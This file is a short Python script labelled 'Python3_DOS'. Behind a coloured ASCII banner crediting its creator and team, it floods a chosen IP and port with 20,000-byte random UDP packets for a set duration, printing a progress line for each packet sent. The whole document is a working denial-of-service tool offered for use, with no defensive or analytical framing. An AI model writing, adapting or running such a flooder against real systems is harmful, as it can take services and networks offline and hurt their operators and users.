import time
import socket
import random
import sys

def usage():
    print("\033[1;32m#########################################################")
    print("#------------------------[\033[1;91mPython3_DOS\033[1;32m]---------------------#")
    print("#-------------------------------------------------------#")
    print("#   \033[1;91mCommand: python3 BLAST.py <ip> <port> <packet> \033[1;32m   #")
    print("#                                                       #")
    print("#\033[1;91mCreator:sksadozai  \033[1;32m##      ###       ##                #")
    print("#\033[1;91mTeam   : SADOZAIs        \033[1;32m##     #          ##                #")
    print("#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #")
    print("#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #")
    print("#               \033[1;91m<--[SUFYAN KHAN SADOZAI]-->         \033[1;32m#")
    print("#########################################################")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout = time.time() + duration
    sent = 3000

    while True:
        if time.time() > timeout:
            break
        else:
            client.sendto(bytes, (victim, vport))
            sent += 1
            print("\033[1;91mMemulai \033[1;32m{} \033[1;91mmengirim paket \033[1;32m{} \033[1;91mpada port \033[1;32m{}".format(sent, victim, vport))

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
